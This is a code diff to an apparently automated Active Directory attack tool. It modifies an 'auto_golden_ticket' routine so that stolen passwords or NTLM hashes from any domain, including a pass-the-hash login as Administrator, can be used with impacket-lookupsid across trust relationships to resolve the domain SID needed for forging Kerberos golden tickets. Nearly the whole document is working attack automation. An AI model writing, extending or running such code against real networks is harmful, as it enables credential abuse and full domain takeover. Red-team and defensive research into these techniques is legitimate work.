@@ -84,7 +84,9 @@ pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch
             })
             .cloned();
 
-        // Collect a password credential for SID lookup (any domain user will do)
+        // Collect a password credential for SID lookup (any domain user will do).
+        // Prefer a cred from the target domain, but fall back to any valid cred
+        // since NTLM cross-domain auth works for lookupsid via trust relationships.
         let lookup_cred = state
             .credentials
             .iter()
@@ -92,6 +94,12 @@ pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch
                 c.domain.to_lowercase() == domain.to_lowercase()
                     && !c.password.is_empty()
                     && !state.is_credential_quarantined(&c.username, &c.domain)
+            })
+            .or_else(|| {
+                state.credentials.iter().find(|c| {
+                    !c.password.is_empty()
+                        && !state.is_credential_quarantined(&c.username, &c.domain)
+                })
             })
             .cloned();
 
@@ -217,16 +225,25 @@ pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch
 /// Resolve domain SID and RID-500 account name by calling `impacket-lookupsid`.
 /// Returns `(domain_sid, Option<admin_name>)`. Tries password credential first,
 /// then NTLM hash.
+///
+/// Uses the credential's own domain for NTLM auth (not the target domain) so
+/// cross-domain trust authentication works — e.g. a `child.contoso.local`
+/// cred can resolve the SID of `contoso.local` via its parent DC.
 async fn resolve_domain_sid(
-    domain: &str,
+    _domain: &str,
     dc_ip: &str,
     password_cred: Option<&ares_core::models::Credential>,
     admin_hash: Option<&ares_core::models::Hash>,
 ) -> Option<(String, Option<String>)> {
-    // Try password auth first
+    // Try password auth first — use the credential's native domain for auth
     if let Some(cred) = password_cred {
+        let auth_domain = if cred.domain.is_empty() {
+            _domain
+        } else {
+            &cred.domain
+        };
         let args = json!({
-            "domain": domain,
+            "domain": auth_domain,
             "username": cred.username,
             "password": cred.password,
             "dc_ip": dc_ip,
@@ -238,18 +255,23 @@ async fn resolve_domain_sid(
                     let admin_name = ares_core::parsing::extract_rid500_name(&text);
                     return Some((sid, admin_name));
                 }
-                warn!("lookupsid succeeded but no SID pattern found in output");
+                warn!(auth_domain = %auth_domain, user = %cred.username, "lookupsid succeeded but no SID pattern found in output");
             }
             Err(e) => {
-                warn!(err = %e, user = %cred.username, "lookupsid with password failed");
+                warn!(err = %e, user = %cred.username, auth_domain = %auth_domain, "lookupsid with password failed");
             }
         }
     }
 
-    // Fall back to hash auth
+    // Fall back to hash auth — use the hash's native domain for auth
     if let Some(hash) = admin_hash {
+        let auth_domain = if hash.domain.is_empty() {
+            _domain
+        } else {
+            &hash.domain
+        };
         let args = json!({
-            "domain": domain,
+            "domain": auth_domain,
             "username": "Administrator",
             "hash": hash.hash_value,
             "dc_ip": dc_ip,
@@ -261,10 +283,10 @@ async fn resolve_domain_sid(
                     let admin_name = ares_core::parsing::extract_rid500_name(&text);
                     return Some((sid, admin_name));
                 }
-                warn!("lookupsid (hash) succeeded but no SID pattern found");
+                warn!(auth_domain = %auth_domain, "lookupsid (hash) succeeded but no SID pattern found");
             }
             Err(e) => {
-                warn!(err = %e, "lookupsid with admin hash failed");
+                warn!(err = %e, auth_domain = %auth_domain, "lookupsid with admin hash failed");
             }
         }
     }
